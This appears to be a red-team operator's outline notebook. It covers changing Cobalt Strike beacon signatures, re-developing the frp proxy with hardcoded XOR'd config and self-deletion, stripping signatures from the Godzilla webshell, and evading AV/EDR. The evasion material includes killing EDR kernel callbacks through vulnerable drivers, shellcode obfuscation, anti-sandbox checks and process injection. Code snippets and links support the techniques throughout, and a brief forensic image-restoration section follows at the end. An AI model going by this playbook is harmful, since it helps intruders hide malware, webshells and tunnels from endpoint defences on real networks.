  - private static byte[] OriginKey = {-1, 12, -6, 65, 7, -47, 91, 48, 17, 61, 29, 43, -99, -23, 21, 109};private static byte[] CustomizeKey = {-1, 12, -6, 65, 7, -47, 91, 48, 17, 61, 29, 43, -99, -23, 21, 109};
    - Modify key
  - Modify profile
    - transform-x64 {    strrep "beacon.x64.dll" "";}
      - Modify keywords
    - set magic_mz_x86 "1234"; set magic_mz_x64 "5678";
      - Modify MZ header
    - set magic_pe "BB";
      - Modify PE header
    - set cleanup "true";
      - Clean the original Beacon DLL
    - set obfuscate "true";
      - Removes the DLL header
    - set userwx "false";
      - No need to make it writable
    - [https://github.com/maxamin/MalwarePack/tree/355cd11bd6dd8d465d6c82187fc3bd52836c52e7/arsenal-kit](https://github.com/maxamin/MalwarePack/tree/355cd11bd6dd8d465d6c82187fc3bd52836c52e7/arsenal-kit)
      - void my_mask_section(SLEEPMASKP * parms, DWORD a, DWORD b) {   char key[] = "cf81d743beef8422";   size_t key_lenght = sizeof(key) - 1;   while (a < b) {      *(parms->beacon_ptr + a) ^= key[a % key_lenght];      a++;   }}
        - Modify sleepmask signatures
      - Modify MSSE pipe signature
  - beaconeye
    - 6A 00
### Traffic forwarding tool re-development

#### Methods

- Modify the tool's User-Agent header
  - [https://hasdata.com/blog/user-agents-for-web-scraping](https://hasdata.com/blog/user-agents-for-web-scraping)
  - User-Agent Switcher and Manager (Chrome extension)
- Self-deleting config file
  - Hard-code the config directly into main
    - func getFileContent(ip string, port string) {	key := "testkey"	ip = str2xor(ip, key)	port = str2xor(port, key)	var configContent string = `[common]        server_addr = ` + ip + `        server_port = ` + port + `	tls_enable = true 	[plugin_socks]	type = tcp	remote_port = 7788	plugin = socks5	#plugin_user = ""	#plugin_passwd = ""	`	fileContent = configContent}
  - if cfg.DELEnable == true { os.Remove(cfgFile) }
- Load config file remotely
- TLS fingerprint
  - [https://github.com/sleeyax/burp-awesome-tls](https://github.com/sleeyax/burp-awesome-tls)
  - frp
    - pkg/util/net/tls.go
- Domain fronting
  - pkg/util/net/websocket.go
  - Configure CDN origin as HTTP
- Uncommon outbound protocols
  - quic
    - transport.protocol = "quic"quicBindPort = 7000
- protobuf plugin
- Custom encryption/decryption
  - chacha20
  - XOR
  - Use complex encryption for config files and auth; simple encryption for traffic packets, otherwise it gets slow
- Remove hardcoding
  - salt, JSON data
    - May crash; watch the handling logic when debugging
    - Pay special attention to the auth part fingerprint
      - models/msg/msg.go
  - const (	FrpWebsocketPath = "/~!frp")
- Compile, obfuscate, pack
  - upx
  - garble
  - [https://github.com/boy-hack/go-strip](https://github.com/boy-hack/go-strip)
- DLL loading
  - After covering EDR environment setup, move on to evasion
- [https://github.com/langsasec/Sign-Sacker](https://github.com/langsasec/Sign-Sacker)
#### Familiarizing with the framework structure

- Framework entry file
- Directory structure
  - fscan
    - common
      - Parsing of data, structs, and variable storage
    - plugins
      - Plugins
        - To understand the project structure and development, start by writing plugins
    - webscan
      - Web scanning
        - Framework fingerprint identification
        - Framework dispatch flow
- Key functions
  - Trace the framework logic forward
    - Modify the framework
  - Set breakpoints and trace backward how this gets called
    - Modify plugins
- Dynamic debugging
- Add encryption/decryption and log output
#### Detection

- [https://github.com/cmluZw/Situational-Awareness](https://github.com/cmluZw/Situational-Awareness)
- [https://github.com/Qianlitp/WatchAD](https://github.com/Qianlitp/WatchAD)
- [https://github.com/Qihoo360/WatchAD2.0](https://github.com/Qihoo360/WatchAD2.0)
- [https://abyssalfish-os.github.io/](https://abyssalfish-os.github.io/)
- Cloud situational awareness
  - SA
### Godzilla signature modification (used for disposable entry points; for large or long-term engagements, develop a dedicated shell management tool)

#### Custom traffic encryption

- Remove the md5 check
  - core/ApplicationConfig.java
- Remove HTTP header signatures
- /shells/cryptions/*
- Change the key value to the last 16 characters; the location is in ShellEntity's getSecretKeyX method and the encryption class's generate method
#### Required tools

- JETBRAIN IDEA
- JETBRAIN RIDER
- ILspy
- sqlitestudio
- vistual studio2022
- The source code from decompiling the website is missing the files in the payload and plugin assets folders under shell; add them manually before repackaging and compiling
#### Custom command execution

- Modify execCommand to copy cmd to a temp directory, execute it, then delete it
- Change the default variable names
- Recompile and replace the original payload.dll
- Modify ShellExecCommandPanel's default command code
- Remove the default command autofill
#### Webshell signature removal

- Rename the reflection Load method and GetMethod to bypass signatures and evade AV (the same applies to Java and C#)
- Change other variables freely to bypass signatures and evade AV
- Modify base64.bin in the template directory in the same folder according to GenerateShellLoder's padding method
- Modify shell.aspx to remove the header and footer
- Decompile payload.dll with ILspy to export the source, change the file and class names, and update the bin template accordingly
#### Plugin development

- Modify the packaged jar and replace the jar in the original lib to successfully add a plugin
- [https://beichendream.github.io/godzillaApi/](https://beichendream.github.io/godzillaApi/)
- Add the Godzilla jar to lib
- The package name must start with shells.plugins. followed by any characters
- Create a class, declare the core.annotation.PluginnAnnotation annotation, then extend and implement the core.imp.Plugin interface, and start writing the feature code
  - Swing UI design
- Register the popup menu at different locations
  - MainActivity.registerJMenu(menu);//registers a standalone menu on the main page MainActivity.registerPluginJMenuItem(pluginMenuItem);//registers a menu item under the plugin menu bar MainActivity.registerShellViewJMenuItem(shellViewMenuItem);//registers a menu item in the right-click popup menu on the Shell management main page
    - Menu registration must be done in a static code block
## **Trojan AV/EDR evasion**

### Setting up a real-world EDR environment

#### Trend Micro

- [https://bbs.kafan.cn/thread-2277040-1-1.html](https://bbs.kafan.cn/thread-2277040-1-1.html)
- [https://github.com/emdnaia/TrendMicroDSAExfil](https://github.com/emdnaia/TrendMicroDSAExfil)
  - QAX Zero Trust has the same issue
#### Symantec

- [https://bbs.kafan.cn/thread-2270682-1-1.html](https://bbs.kafan.cn/thread-2270682-1-1.html)
#### MDE

- Requires official purchase and installation
  - Change the system region
#### [https://bbs.kafan.cn/forum-89-1.html](https://bbs.kafan.cn/forum-89-1.html)

- Kafan forum download + tutorials
#### Xianyu marketplace

#### Install the server first, then the client

- After it comes online, snapshot the VM
  - Disconnect from the network before testing evasion
  - If an online sample gets uploaded, make sure debug info and the symbol table are stripped at compile time
### Beacon evasion

#### Blinding EDR via vulnerable drivers

- Install the development environment
  - [https://learn.microsoft.com/zh-cn/windows-hardware/drivers/](https://learn.microsoft.com/zh-cn/windows-hardware/drivers/)
    - Install the SDK first
    - Then install the WDK
    - Install the mitigation 143 series
    - Success means a WDM appears
- Basic knowledge
- Kill user-mode processes
  - Take the endpoint offline
  - ZwTerminateProcess
    - blackout
      - typedef struct _CLIENT_ID {    HANDLE UniqueProcess;  // process handle    HANDLE UniqueThread;   // thread handle} CLIENT_ID;
- Kill the callbacks
  - ObRegisterCallbacks
    - Open or duplicate handles of specific object types
      - PsProcessType, PsThreadType
        - CallbackList
          - PreOperation \ PostOperation = 0
  - CmRegisterCallback
    - Access and modify the registry
      - CallbackListHead
        - PEX_CALLBACK_FUNCTION
          - Change the pointed address to an address value already present on the doubly linked list
          - PG protection will cause a BSOD
  - MiniFilter
    - Create/modify/delete files
      - volume
        - FLT_VOLUMES
          - _CALLBACK_NODE
            - Change the first address directly to the _CALLBACK_NODE structure address from a system built-in driver
  - PsSetCreateProcessNotifyRoutine
    - When a process is created or destroyed
  - PsSetCreateThreadNotifyRoutine
    - When a thread is created or destroyed
      - typedef struct _EX_CALLBACK_ROUTINE_BLOCK {    EX_RUNDOWN_REF RundownProtect;    PEX_CALLBACK_FUNCTION Function;    PVOID Context;} EX_CALLBACK_ROUTINE_BLOCK, *PEX_CALLBACK_ROUTINE_BLOCK;
        - [https://reactos.org/](https://reactos.org/)
  - PsSetLoadImageNotifyRoutine
    - When any Image (EXE, DLL, driver) file is loaded
- [https://www.loldrivers.io/drivers/](https://www.loldrivers.io/drivers/)
  - [https://github.com/Cr4sh/ioctlfuzzer](https://github.com/Cr4sh/ioctlfuzzer)
    - Kernel fuzz tool
      - Enable kernel memory dump
  - [https://github.com/koutto/ioctlbf](https://github.com/koutto/ioctlbf)
  - [https://github.com/k0keoyo/kDriver-Fuzzer](https://github.com/k0keoyo/kDriver-Fuzzer)
  - [https://github.com/nccgroup/DIBF](https://github.com/nccgroup/DIBF)
  - [https://github.com/IntelLabs/kAFL](https://github.com/IntelLabs/kAFL)
  - [https://github.com/Z4kSec/IoctlHunter](https://github.com/Z4kSec/IoctlHunter)
  - [https://github.com/0dayResearchLab/msFuzz](https://github.com/0dayResearchLab/msFuzz)
  - [https://github.com/zeze-zeze/ioctlance](https://github.com/zeze-zeze/ioctlance)
- Exploitation
  - [https://github.com/paysonism/payson-ioctl-cheat-driver](https://github.com/paysonism/payson-ioctl-cheat-driver)
  - [https://github.com/Hagrid29/BYOVDKit](https://github.com/Hagrid29/BYOVDKit)
  - [https://github.com/BlackSnufkin/BYOVD](https://github.com/BlackSnufkin/BYOVD)
#### Encryption and obfuscation for evasion

- Detection methods
  - Static detection
    - Signatures
      - hash, file name, function name, sensitive strings, sensitive APIs...
      - PE file header info, imports, exports, TLS, section info; shellcode code info; shellcode loader code info
    - Cloud detection
    - Checksum
      - Periodically check file checksums
    - Heuristics
      - Machine learning
      - yara
    - Evasion
      - Staging
      - Encryption/decryption
        - aes
        - rsa
        - Classical ciphers
        - .....
      - Encoding
        - XOR
        - base64
        - uuid
        - mac
        - IP address
        - Registry key values
          - RegQueryValueExA
          - RegQueryValueExA
        - Read data from the clipboard
          - RegisterClipboardFormat
          - GetClipboardFormatName
        - .....
      - Variable name obfuscation
        - [https://pyob.oxyry.com/](https://pyob.oxyry.com/)
      - Control flow obfuscation
      - Modify shellcode signatures that have no effect
        - One byte in CS defeats YARA
      - Serialization
        - protobuf
        - pickle
      - **Treat the shellcode as a string**
      - Staged loading
        - File
        - url
      - Dynamically load APIs
        - loadlibrary+getprocaddress
        - fs->TEB, PEB->kernel32.dll->loadlibrary+getprocaddress
        - SSN->syscall
          - [https://j00ru.vexillium.org/syscalls/nt/64/](https://j00ru.vexillium.org/syscalls/nt/64/)
          - #include <unistd.h>
            - syscall(SYS_write, STDOUT_FILENO, message, length);
              - AV warning
          - [https://github.com/klezVirus/SysWhispers3](https://github.com/klezVirus/SysWhispers3)
          - [https://github.com/voidvxvt/HellBunny](https://github.com/voidvxvt/HellBunny)
    - Memory loader
      - Allocate executable memory
        - VirtualProtect
        - VirtualAlloc
        - AllocADsMem
        - ReallocADsMem
        - HeapCreate
      - Write shellcode into memory
        - RtlMoveMemory
        - RtlCopyMemory
      - Execute that memory
        - EnumSystemLocalesA
        - CreateThread
        - WaitForSingleObject
      - [https://github.com/0xsp-SRD/ZigStrike](https://github.com/0xsp-SRD/ZigStrike)
      - Function replacement
        - [http://ropgadget.com/posts/abusing_win_functions.html](http://ropgadget.com/posts/abusing_win_functions.html)
      - Execute inside the loader
        - Easier to evade AV detection
  - Dynamic detection
    - Sandbox
    - Memory detection
    - Evasion
      - Anti-sandbox
        - Uptime
        - Physical memory
        - Number of CPUs
        - Number of Temp files
        - Server-side check with a random string
        - USB records
        - Sample name
        - Disk size
        - Network availability
        - Named pipe availability
      - Dynamic memory loading
        - inline hook sleep
          - Customize the sleep function logic after the hook
        - CreateTimerQueueTimer
      - Remote thread injection
        - CreateRemoteThread
          - OpenProcess
          - VirtualAllocEx
          - WriteProcessMemory
      - APC injection
        - APC + indirect syscalls + module stomping
        - QueueUserApc
        - Early Bird
      - Self-developed RAT
        - Separate the functions
      - DLL hijacking
        - WinSxS DLL hijacking
        - Microsoft component hijacking
          - onedrive
        - DLL hijacking automation scripts
      - Callbacks
        - EnumChildWindows
        - AlternativeShellcodeExec
      - LLVM obfuscation
        - [https://github.com/KomiMoe/Arkari](https://github.com/KomiMoe/Arkari)
      - Break the process chain
        - Ring 3
          - ldte->InInitializationOrderModuleList.Blink->Flink = ldte->InInitializationOrderModuleList.Flink;
          - ldte->InInitializationOrderModuleList.Flink->Blink = ldte->InInitializationOrderModuleList.Blink;
        - Ring 0
          - PsActiveProcessHead->Eprocess
      - Inject into other processes
        - A loader that can't be killed
      - Kernel injection
        - [https://ti.qianxin.com/blog/articles/The-Nightmare-of-EDR-Storm-0978-Utilizing-New-Kernel-Injection-Technique-Step-Bear-CN/](https://ti.qianxin.com/blog/articles/The-Nightmare-of-EDR-Storm-0978-Utilizing-New-Kernel-Injection-Technique-Step-Bear-CN/)
  - Traffic detection
    - Traffic signatures
      - Encrypted fields in fixed communication protocols
        - Cobalt Strike's protocol transfers the AES key via RSA, and the AES key encrypts subsequent traffic
    - Content signatures
      - Whether the data field contains encrypted command-related keywords
    - Structural signatures
      - Fixed field signatures
    - ip
## **Evidence image system restoration**

### linux

#### Restore the image

- [https://qemu.weilnetz.de/w64/](https://qemu.weilnetz.de/w64/)
  - qemu-img convert -f raw <input>.raw -O vmdk <output>.vmdk
#### Modify the VM configuration

- Choose "use existing disk"
#### Change the password

- At the boot screen, select the first entry and press e to enter single-user mode
- Delete everything after ro and replace it with rw init=/bin/bash
- Remove the Alibaba Cloud cloud-init
  - rm -rf $(find / 2>/dev/null|grep cloud-init)
- passwd
  - Change the password
#### Modify the network

- ip a
- dhclient eth0
- Set the network to host-only
#### View command history

#### View services

#### Files corresponding to services

## hw
